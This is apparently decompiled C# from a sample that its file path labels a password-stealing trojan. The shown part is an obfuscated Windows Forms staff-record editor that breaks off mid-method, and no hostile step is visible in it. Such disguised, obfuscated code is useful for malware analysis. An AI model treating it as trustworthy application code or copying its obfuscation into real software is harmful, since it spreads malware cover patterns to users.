// Decompiled with JetBrains decompiler
// Type: w9DH.o3GX
// Assembly: k3F4, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EF2862A8-7088-4F2B-ADD5-AFDC446098D9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee71029a7b3d9d85e7a6c7c0ecc35d93ee37514713ba5033d491a0d7506e947b.exe

using Ey7q;
using m5F8;
using Microsoft.VisualBasic.CompilerServices;
using r9H2;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.Linq;
using System.Drawing;
using System.Drawing.Printing;
using System.Linq;
using System.Linq.Expressions;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using System.Windows.Forms;
using System.Windows.Forms.Automation;
using x7X;
using z0R5;

namespace w9DH
{
  [DesignerGenerated]
  public class o3GX : Form
  {
    [AccessedThroughProperty("Ⴃ")]
    private Label ႥႤ;
    [AccessedThroughProperty("Ⴍ")]
    private ComboBox ႥႨ;
    [AccessedThroughProperty("Ⴈ")]
    private Button ႥႠ;
    [AccessedThroughProperty("Ⴓ")]
    private RadioButton ႥႣ;
    [AccessedThroughProperty("ႣႷ")]
    private Button ႤႳ;
    [AccessedThroughProperty("ႣႨ")]
    private RadioButton ႨႤ;
    [AccessedThroughProperty("ႣႥ")]
    private Label ႨႳ;
    [AccessedThroughProperty("ႭႷ")]
    private Label ႨႰ;
    [AccessedThroughProperty("ႭႣ")]
    private Label ႨႣ;
    [AccessedThroughProperty("ႭႤ")]
    private Label ႳႷ;
    [AccessedThroughProperty("ႭႰ")]
    private Label ႳႥ;
    [AccessedThroughProperty("ႭႠ")]
    private MaskedTextBox ႳႨ;
    [AccessedThroughProperty("ႭႳ")]
    private MaskedTextBox ႳႭ;
    [AccessedThroughProperty("ႤႷ")]
    private PrintDocument ႳႰ;
    [AccessedThroughProperty("ႤႭ")]
    private Label ႳႼ;
    [AccessedThroughProperty("ႤႤ")]
    private Label ႠႷ;
    [AccessedThroughProperty("ႤႰ")]
    private Label ႠႥ;
    public string ႠႨ;
    private o3GX.Dj7b Ⴃ = new o3GX.Dj7b();

    public o3GX()
    {
      this.Shown += new EventHandler(this.p1JW);
      this.Cw2s();
    }

    protected virtual void i4A1([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.Ⴃ.Ⴓ == null)
          return;
        this.Ⴃ.Ⴓ.Dispose();
      }
      finally
      {
        this.Dispose(obj0);
      }
    }

    private void Cw2s()
    {
      ResourceManager resourceManager = (ResourceManager) new ComponentResourceManager(typeof (o3GX));
      this.Ⴗ = new Label();
      this.Ⴃ = new Label();
      this.Ⴍ = new ComboBox();
      this.Ⴄ = new Label();
      this.Ⴐ = new Label();
      this.Ⴈ = new Button();
      this.Ⴀ = new Label();
      this.Ⴓ = new RadioButton();
      this.Ⴅ = new ComboBox();
      this.Ⴜ = new Label();
      this.ႣႷ = new Button();
      this.ႣႣ = new Button();
      this.ႣႭ = new TextBox();
      this.ႣႤ = new TextBox();
      this.ႣႰ = new GroupBox();
      this.ႣႨ = new RadioButton();
      this.ႣႠ = new DateTimePicker();
      this.ႣႳ = new Label();
      this.ႣႥ = new Label();
      this.ႣႼ = new Label();
      this.ႭႷ = new Label();
      this.ႭႣ = new Label();
      this.ႭႭ = new Label();
      this.ႭႤ = new Label();
      this.ႭႰ = new Label();
      this.ႭႨ = new Label();
      this.ႭႠ = new MaskedTextBox();
      this.ႭႳ = new MaskedTextBox();
      this.ႭႥ = new MaskedTextBox();
      this.ႭႼ = new Button();
      this.ႤႷ = new PrintDocument();
      this.ႤႣ = new PrintPreviewDialog();
      this.ႤႭ = new Label();
      this.ႤႤ = new Label();
      this.ႤႰ = new Label();
      this.ႤႨ = new MaskedTextBox();
      this.ႣႰ.SuspendLayout();
      this.SuspendLayout();
      this.Ⴗ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴗ.ForeColor = SystemColors.Desktop;
      this.Ⴗ.Location = new Point(446, 448);
      this.Ⴗ.Name = "lblhourpay";
      this.Ⴗ.Size = new Size(112, 28);
      this.Ⴗ.TabIndex = 106;
      this.Ⴗ.Text = "Hourly Pay: ";
      this.Ⴗ.TextAlign = ContentAlignment.MiddleRight;
      this.Ⴃ.AutoSize = true;
      this.Ⴃ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴃ.ForeColor = SystemColors.GradientActiveCaption;
      this.Ⴃ.Location = new Point(411, 450);
      this.Ⴃ.Name = "lblextra";
      this.Ⴃ.Size = new Size(0, 20);
      this.Ⴃ.TabIndex = 105;
      this.Ⴍ.DropDownStyle = ComboBoxStyle.DropDownList;
      this.Ⴍ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴍ.FormattingEnabled = true;
      this.Ⴍ.Items.AddRange(new object[6]
      {
        (object) "5",
        (object) "4",
        (object) "3",
        (object) "2",
        (object) "1",
        (object) "0"
      });
      this.Ⴍ.Location = new Point(309, 450);
      this.Ⴍ.Name = "cboLeave";
      this.Ⴍ.Size = new Size(80, 28);
      this.Ⴍ.TabIndex = 9;
      this.Ⴄ.AutoSize = true;
      this.Ⴄ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴄ.Location = new Point(161, 450);
      this.Ⴄ.Name = "Label11";
      this.Ⴄ.Size = new Size(143, 20);
      this.Ⴄ.TabIndex = 103;
      this.Ⴄ.Text = "LeaveApplyLeft :";
      this.Ⴐ.BorderStyle = BorderStyle.FixedSingle;
      this.Ⴐ.ForeColor = SystemColors.GradientActiveCaption;
      this.Ⴐ.Location = new Point(588, 21);
      this.Ⴐ.Name = "lblIndex";
      this.Ⴐ.Size = new Size(91, 32);
      this.Ⴐ.TabIndex = 102;
      this.Ⴈ.BackColor = Color.IndianRed;
      this.Ⴈ.Cursor = Cursors.Hand;
      this.Ⴈ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴈ.ForeColor = SystemColors.ControlLightLight;
      this.Ⴈ.Location = new Point(407, 523);
      this.Ⴈ.Name = "btnDelete";
      this.Ⴈ.Size = new Size(92, 52);
      this.Ⴈ.TabIndex = 12;
      this.Ⴈ.Text = "&Delete";
      this.Ⴈ.UseVisualStyleBackColor = false;
      this.Ⴀ.Font = new Font("Microsoft Sans Serif", 16f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, (byte) 0);
      this.Ⴀ.Location = new Point(155, 21);
      this.Ⴀ.Name = "Label9";
      this.Ⴀ.Size = new Size(427, 49);
      this.Ⴀ.TabIndex = 100;
      this.Ⴀ.Text = "Update Personal Details";
      this.Ⴓ.AutoSize = true;
      this.Ⴓ.Location = new Point(98, 6);
      this.Ⴓ.Name = "radFemale";
      this.Ⴓ.Size = new Size(93, 24);
      this.Ⴓ.TabIndex = 18;
      this.Ⴓ.TabStop = true;
      this.Ⴓ.Text = "Female";
      this.Ⴓ.UseVisualStyleBackColor = true;
      this.Ⴅ.DropDownStyle = ComboBoxStyle.DropDownList;
      this.Ⴅ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴅ.FormattingEnabled = true;
      this.Ⴅ.Items.AddRange(new object[4]
      {
        (object) "IT Dept.",
        (object) "HR Dept.",
        (object) "Accounting Dept.",
        (object) "Marketing Dept."
      });
      this.Ⴅ.Location = new Point(309, 117);
      this.Ⴅ.Name = "cboDepart";
      this.Ⴅ.Size = new Size(324, 28);
      this.Ⴅ.TabIndex = 1;
      this.Ⴜ.AutoSize = true;
      this.Ⴜ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Ⴜ.Location = new Point(161, 117);
      this.Ⴜ.Name = "Label8";
      this.Ⴜ.Size = new Size(114, 20);
      this.Ⴜ.TabIndex = 98;
      this.Ⴜ.Text = "Department :";
      this.ႣႷ.BackColor = Color.Goldenrod;
      this.ႣႷ.Cursor = Cursors.Hand;
      this.ႣႷ.DialogResult = DialogResult.Cancel;
      this.ႣႷ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႷ.ForeColor = SystemColors.ControlLightLight;
      this.ႣႷ.Location = new Point(505, 523);
      this.ႣႷ.Name = "btnCancel";
      this.ႣႷ.Size = new Size(87, 53);
      this.ႣႷ.TabIndex = 13;
      this.ႣႷ.Text = "&Cancel";
      this.ႣႷ.UseVisualStyleBackColor = false;
      this.ႣႣ.BackColor = Color.MediumSeaGreen;
      this.ႣႣ.Cursor = Cursors.Hand;
      this.ႣႣ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႣ.ForeColor = SystemColors.ControlLightLight;
      this.ႣႣ.Location = new Point(309, 523);
      this.ႣႣ.Name = "btnUpdate";
      this.ႣႣ.Size = new Size(94, 52);
      this.ႣႣ.TabIndex = 11;
      this.ႣႣ.Text = "&Update";
      this.ႣႣ.UseVisualStyleBackColor = false;
      this.ႣႭ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႭ.Location = new Point(309, 408);
      this.ႣႭ.Name = "txtAddress";
      this.ႣႭ.Size = new Size(324, 26);
      this.ႣႭ.TabIndex = 8;
      this.ႣႤ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႤ.Location = new Point(309, 366);
      this.ႣႤ.Name = "txtEmail";
      this.ႣႤ.Size = new Size(324, 26);
      this.ႣႤ.TabIndex = 7;
      this.ႣႰ.Controls.Add((Control) this.Ⴓ);
      this.ႣႰ.Controls.Add((Control) this.ႣႨ);
      this.ႣႰ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႰ.Location = new Point(309, 282);
      this.ႣႰ.Name = "GroupBox1";
      this.ႣႰ.Size = new Size(324, 36);
      this.ႣႰ.TabIndex = 5;
      this.ႣႰ.TabStop = false;
      this.ႣႨ.AutoSize = true;
      this.ႣႨ.Checked = true;
      this.ႣႨ.Location = new Point(0, 6);
      this.ႣႨ.Name = "radMale";
      this.ႣႨ.Size = new Size(72, 24);
      this.ႣႨ.TabIndex = 0;
      this.ႣႨ.TabStop = true;
      this.ႣႨ.Text = "Male";
      this.ႣႨ.UseVisualStyleBackColor = true;
      this.ႣႠ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႠ.Location = new Point(309, 242);
      this.ႣႠ.Name = "DateDOB";
      this.ႣႠ.Size = new Size(324, 26);
      this.ႣႠ.TabIndex = 4;
      this.ႣႳ.BorderStyle = BorderStyle.FixedSingle;
      this.ႣႳ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႳ.Location = new Point(309, 72);
      this.ႣႳ.Name = "lblStaffID";
      this.ႣႳ.Size = new Size(324, 33);
      this.ႣႳ.TabIndex = 88;
      this.ႣႥ.AutoSize = true;
      this.ႣႥ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႥ.Location = new Point(161, 85);
      this.ႣႥ.Name = "Label10";
      this.ႣႥ.Size = new Size(83, 20);
      this.ႣႥ.TabIndex = 87;
      this.ႣႥ.Text = "StaffID : ";
      this.ႣႼ.AutoSize = true;
      this.ႣႼ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႣႼ.Location = new Point(161, 242);
      this.ႣႼ.Name = "Label3";
      this.ႣႼ.Size = new Size(125, 20);
      this.ႣႼ.TabIndex = 82;
      this.ႣႼ.Text = "Date Of Birth :";
      this.ႭႷ.AutoSize = true;
      this.ႭႷ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႷ.Location = new Point(161, 163);
      this.ႭႷ.Name = "Label1";
      this.ႭႷ.Size = new Size(70, 20);
      this.ႭႷ.TabIndex = 80;
      this.ႭႷ.Text = "Name : ";
      this.ႭႣ.AutoSize = true;
      this.ႭႣ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႣ.Location = new Point(161, 366);
      this.ႭႣ.Name = "Label7";
      this.ႭႣ.Size = new Size(68, 20);
      this.ႭႣ.TabIndex = 86;
      this.ႭႣ.Text = "Email : ";
      this.ႭႭ.AutoSize = true;
      this.ႭႭ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႭ.Location = new Point(161, 408);
      this.ႭႭ.Name = "Label6";
      this.ႭႭ.Size = new Size(90, 20);
      this.ႭႭ.TabIndex = 85;
      this.ႭႭ.Text = "Address : ";
      this.ႭႤ.AutoSize = true;
      this.ႭႤ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႤ.Location = new Point(161, 324);
      this.ႭႤ.Name = "Label5";
      this.ႭႤ.Size = new Size(97, 20);
      this.ႭႤ.TabIndex = 84;
      this.ႭႤ.Text = "Phone No :";
      this.ႭႰ.AutoSize = true;
      this.ႭႰ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႰ.Location = new Point(161, 282);
      this.ႭႰ.Name = "Label4";
      this.ႭႰ.Size = new Size(84, 20);
      this.ႭႰ.TabIndex = 83;
      this.ႭႰ.Text = "Gender : ";
      this.ႭႨ.AutoSize = true;
      this.ႭႨ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႨ.Location = new Point(161, 202);
      this.ႭႨ.Name = "Label2";
      this.ႭႨ.Size = new Size(102, 20);
      this.ႭႨ.TabIndex = 81;
      this.ႭႨ.Text = "IC number :";
      this.ႭႠ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႠ.Location = new Point(309, 163);
      this.ႭႠ.Mask = "LLLLLLLLLLLLLLLLLL";
      this.ႭႠ.Name = "txtName";
      this.ႭႠ.Size = new Size(324, 26);
      this.ႭႠ.TabIndex = 2;
      this.ႭႳ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႳ.Location = new Point(309, 324);
      this.ႭႳ.Mask = "00000000009";
      this.ႭႳ.Name = "txtPhone";
      this.ႭႳ.Size = new Size(324, 26);
      this.ႭႳ.TabIndex = 6;
      this.ႭႥ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႥ.Location = new Point(309, 202);
      this.ႭႥ.Mask = "000000-00-0000";
      this.ႭႥ.Name = "txtIC";
      this.ႭႥ.Size = new Size(324, 26);
      this.ႭႥ.TabIndex = 3;
      this.ႭႼ.BackColor = SystemColors.Highlight;
      this.ႭႼ.Cursor = Cursors.Hand;
      this.ႭႼ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႭႼ.ForeColor = SystemColors.ControlLightLight;
      this.ႭႼ.Location = new Point(598, 524);
      this.ႭႼ.Name = "btnPrint";
      this.ႭႼ.Size = new Size(104, 51);
      this.ႭႼ.TabIndex = 14;
      this.ႭႼ.Text = "&Print";
      this.ႭႼ.UseVisualStyleBackColor = false;
      this.ႤႣ.AutoScrollMargin = new Size(0, 0);
      this.ႤႣ.AutoScrollMinSize = new Size(0, 0);
      this.ႤႣ.ClientSize = new Size(400, 300);
      this.ႤႣ.Enabled = true;
      this.ႤႣ.Icon = (Icon) resourceManager.GetObject("dlgPreview.Icon");
      this.ႤႣ.Name = "dlgPreview";
      this.ႤႣ.Visible = false;
      this.ႤႭ.BorderStyle = BorderStyle.FixedSingle;
      this.ႤႭ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႤႭ.Location = new Point(309, 491);
      this.ႤႭ.Name = "lblJoin";
      this.ႤႭ.Size = new Size(324, 29);
      this.ႤႭ.TabIndex = 110;
      this.ႤႤ.AutoSize = true;
      this.ႤႤ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႤႤ.Location = new Point(161, 491);
      this.ႤႤ.Name = "Label12";
      this.ႤႤ.Size = new Size(116, 20);
      this.ႤႤ.TabIndex = 109;
      this.ႤႤ.Text = "Joined Date :";
      this.ႤႰ.AutoSize = true;
      this.ႤႰ.ForeColor = SystemColors.GradientActiveCaption;
      this.ႤႰ.Location = new Point(668, 448);
      this.ႤႰ.Name = "lblPass";
      this.ႤႰ.Size = new Size(0, 20);
      this.ႤႰ.TabIndex = 112;
      this.ႤႨ.Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.ႤႨ.Location = new Point(555, 452);
      this.ႤႨ.Mask = "009";
      this.ႤႨ.Name = "txtHourlyPay";
      this.ႤႨ.Size = new Size(78, 26);
      this.ႤႨ.TabIndex = 10;
      this.AcceptButton = (IButtonControl) this.ႣႣ;
      this.AutoScaleDimensions = new SizeF(9f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.GradientActiveCaption;
      this.CancelButton = (IButtonControl) this.ႣႷ;
      this.ClientSize = new Size(780, 592);
      this.Controls.Add((Control) this.ႤႨ);
      this.Controls.Add((Control) this.ႤႰ);
      this.Controls.Add((Control) this.ႤႭ);
      this.Controls.Add((Control) this.ႤႤ);
      this.Controls.Add((Control) this.ႭႼ);
      this.Controls.Add((Control) this.ႭႳ);
      this.Controls.Add((Control) this.ႭႥ);
      this.Controls.Add((Control) this.ႭႠ);
      this.Controls.Add((Control) this.Ⴗ);
      this.Controls.Add((Control) this.Ⴃ);
      this.Controls.Add((Control) this.Ⴍ);
      this.Controls.Add((Control) this.Ⴄ);
      this.Controls.Add((Control) this.Ⴐ);
      this.Controls.Add((Control) this.Ⴈ);
      this.Controls.Add((Control) this.Ⴀ);
      this.Controls.Add((Control) this.Ⴅ);
      this.Controls.Add((Control) this.Ⴜ);
      this.Controls.Add((Control) this.ႣႷ);
      this.Controls.Add((Control) this.ႣႣ);
      this.Controls.Add((Control) this.ႣႭ);
      this.Controls.Add((Control) this.ႣႤ);
      this.Controls.Add((Control) this.ႣႰ);
      this.Controls.Add((Control) this.ႣႠ);
      this.Controls.Add((Control) this.ႣႳ);
      this.Controls.Add((Control) this.ႣႥ);
      this.Controls.Add((Control) this.ႣႼ);
      this.Controls.Add((Control) this.ႭႷ);
      this.Controls.Add((Control) this.ႭႣ);
      this.Controls.Add((Control) this.ႭႭ);
      this.Controls.Add((Control) this.ႭႤ);
      this.Controls.Add((Control) this.ႭႰ);
      this.Controls.Add((Control) this.ႭႨ);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Name = "ႳႥ";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Update / Delete Staff";
      this.ႣႰ.ResumeLayout(false);
      this.ႣႰ.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label Ⴗ
    {
      get => this.Ⴃ.Ⴐ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴐ = (IAutomationLiveRegion) value as Label;
    }

    internal virtual Label Ⴃ
    {
      get => this.ႥႤ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႥႤ = value;
    }

    internal virtual ComboBox Ⴍ
    {
      get => this.ႥႨ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႥႨ = value;
    }

    internal virtual Label Ⴄ
    {
      get => this.Ⴃ.Ⴄ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴄ = value;
    }

    internal virtual Label Ⴐ
    {
      get => this.Ⴃ.Ⴍ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴍ = (object) value as Label;
    }

    internal virtual Button Ⴈ
    {
      get => this.ႥႠ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        MulticastDelegate multicastDelegate = (MulticastDelegate) new EventHandler(this.Qy1g);
        ButtonBase ⴅⴀ1 = (ButtonBase) this.ႥႠ;
        if (ⴅⴀ1 is Button)
          (ⴅⴀ1 as Button).Click -= (EventHandler) multicastDelegate;
        this.ႥႠ = value;
        ButtonBase ⴅⴀ2 = (ButtonBase) this.ႥႠ;
        if ((Button) ⴅⴀ2 == null)
          return;
        (ⴅⴀ2 as Button).Click += multicastDelegate as EventHandler;
      }
    }

    internal virtual Label Ⴀ
    {
      get => this.Ⴃ.Ⴀ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴀ = (IAutomationLiveRegion) value as Label;
    }

    internal virtual RadioButton Ⴓ
    {
      get => this.ႥႣ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႥႣ = value;
    }

    internal virtual ComboBox Ⴅ
    {
      get => this.Ⴃ.Ⴅ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴅ = (ListControl) value as ComboBox;
    }

    internal virtual Label Ⴜ
    {
      get => this.Ⴃ.Ⴈ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴈ = value;
    }

    internal virtual Button ႣႷ
    {
      get => this.ႤႳ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new EventHandler(this.z2HF);
        object ⴄⴓ1 = (object) this.ႤႳ;
        if (ⴄⴓ1 is Button)
          (ⴄⴓ1 as Button).Click -= obj as EventHandler;
        this.ႤႳ = value;
        object ⴄⴓ2 = (object) this.ႤႳ;
        if ((Button) ⴄⴓ2 == null)
          return;
        (ⴄⴓ2 as Button).Click += obj as EventHandler;
      }
    }

    internal virtual Button ႣႣ
    {
      get => this.Ⴃ.Ⴃ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new EventHandler(this.w3DY);
        IButtonControl ⴃ1 = (IButtonControl) this.Ⴃ.Ⴃ;
        if ((Button) ⴃ1 != null)
          ((Control) ⴃ1).Click -= obj as EventHandler;
        this.Ⴃ.Ⴃ = value;
        IButtonControl ⴃ2 = (IButtonControl) this.Ⴃ.Ⴃ;
        if (!(ⴃ2 is Button))
          return;
        (ⴃ2 as Button).Click += obj as EventHandler;
      }
    }

    internal virtual TextBox ႣႭ
    {
      get => this.Ⴃ.Ⴗ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴗ = value;
    }

    internal virtual TextBox ႣႤ
    {
      get => this.Ⴃ.Ⴜ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.Ⴜ = (TextBoxBase) value as TextBox;
    }

    internal virtual GroupBox ႣႰ
    {
      get => this.Ⴃ.ႰႳ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႳ = value;
    }

    internal virtual RadioButton ႣႨ
    {
      get => this.ႨႤ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႨႤ = value;
    }

    internal virtual DateTimePicker ႣႠ
    {
      get => this.Ⴃ.ႰႰ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႰ = value;
    }

    internal virtual Label ႣႳ
    {
      get => this.Ⴃ.ႰႤ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႤ = (object) value as Label;
    }

    internal virtual Label ႣႥ
    {
      get => this.ႨႳ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႨႳ = value;
    }

    internal virtual Label ႣႼ
    {
      get => this.Ⴃ.ႰႭ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႭ = value;
    }

    internal virtual Label ႭႷ
    {
      get => this.ႨႰ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႨႰ = value;
    }

    internal virtual Label ႭႣ
    {
      get => this.ႨႣ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႨႣ = value;
    }

    internal virtual Label ႭႭ
    {
      get => this.Ⴃ.ႰႠ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႠ = (object) value as Label;
    }

    internal virtual Label ႭႤ
    {
      get => this.ႳႷ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႷ = value;
    }

    internal virtual Label ႭႰ
    {
      get => this.ႳႥ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႥ = value;
    }

    internal virtual Label ႭႨ
    {
      get => this.Ⴃ.ႰႥ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႥ = (object) value as Label;
    }

    internal virtual MaskedTextBox ႭႠ
    {
      get => this.ႳႨ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႨ = value;
    }

    internal virtual MaskedTextBox ႭႳ
    {
      get => this.ႳႭ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႭ = value;
    }

    internal virtual MaskedTextBox ႭႥ
    {
      get => this.Ⴃ.ႰႨ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႨ = value;
    }

    internal virtual Button ႭႼ
    {
      get => this.Ⴃ.ႰႣ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        object obj = (object) new EventHandler(this.Mc48);
        ButtonBase ⴐⴃ1 = (ButtonBase) this.Ⴃ.ႰႣ;
        if (ⴐⴃ1 is Button)
          (ⴐⴃ1 as Button).Click -= (EventHandler) obj;
        this.Ⴃ.ႰႣ = (ButtonBase) value as Button;
        ButtonBase ⴐⴃ2 = (ButtonBase) this.Ⴃ.ႰႣ;
        if ((Button) ⴐⴃ2 == null)
          return;
        ⴐⴃ2.Click += obj as EventHandler;
      }
    }

    internal virtual PrintDocument ႤႷ
    {
      get => this.ႳႰ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set
      {
        MulticastDelegate multicastDelegate = (MulticastDelegate) new PrintPageEventHandler(this.f3F6);
        Component ⴓⴐ1 = (Component) this.ႳႰ;
        if (ⴓⴐ1 is PrintDocument)
          (ⴓⴐ1 as PrintDocument).PrintPage -= multicastDelegate as PrintPageEventHandler;
        this.ႳႰ = value;
        Component ⴓⴐ2 = (Component) this.ႳႰ;
        if ((PrintDocument) ⴓⴐ2 == null)
          return;
        (ⴓⴐ2 as PrintDocument).PrintPage += multicastDelegate as PrintPageEventHandler;
      }
    }

    internal virtual PrintPreviewDialog ႤႣ
    {
      get => this.Ⴃ.ႰႷ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႷ = (object) value as PrintPreviewDialog;
    }

    internal virtual Label ႤႭ
    {
      get => this.ႳႼ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႳႼ = value;
    }

    internal virtual Label ႤႤ
    {
      get => this.ႠႷ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႠႷ = value;
    }

    internal virtual Label ႤႰ
    {
      get => this.ႠႥ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.ႠႥ = value;
    }

    internal virtual MaskedTextBox ႤႨ
    {
      get => this.Ⴃ.ႰႼ;
      [MethodImpl(MethodImplOptions.Synchronized)] [param: In] set => this.Ⴃ.ႰႼ = value;
    }

    private void p1JW([In] object obj0, [In] EventArgs obj1)
    {
      this.ႣႠ.MaxDate = DateTime.Now.Subtract(new TimeSpan(5479, 0, 0, 0, 0));
      Table<Af03> ⴃ1 = new Tt1().Ⴃ;
      Expression expression = (Expression) Expression.Parameter(typeof (Af03), "o");
      // ISSUE: method reference
      // ISSUE: method reference
      // ISSUE: field reference
      Expression<Func<Af03, bool>> predicate = Expression.Lambda<Func<Af03, bool>>((Expression) Expression.Equal((Expression) Expression.Call((Expression) null, (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Operators.CompareString)), new Expression[3]
      {
        (Expression) Expression.Property((Expression) (expression as ParameterExpression), (MethodInfo) MethodBase.GetMethodFromHandle(__methodref (Af03.i0KG))),
        (Expression) Expression.Field((Expression) Expression.Constant((object) this, typeof (o3GX)), FieldInfo.GetFieldFromHandle(__fieldref (o3GX.ႠႨ))),
        (Expression) Expression.Constant((object) false, typeof (bool))
      }), (Expression) Expression.Constant((object) 0, typeof (int)), false, (MethodInfo) null), (ParameterExpression) expression);
      object obj = (object) ⴃ1.FirstOrDefault<Af03>(predicate);
      if ((Af03) obj == null)
      {
        int num = (int) MessageBox.Show("Staff not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.Close();
      }
      else
      {
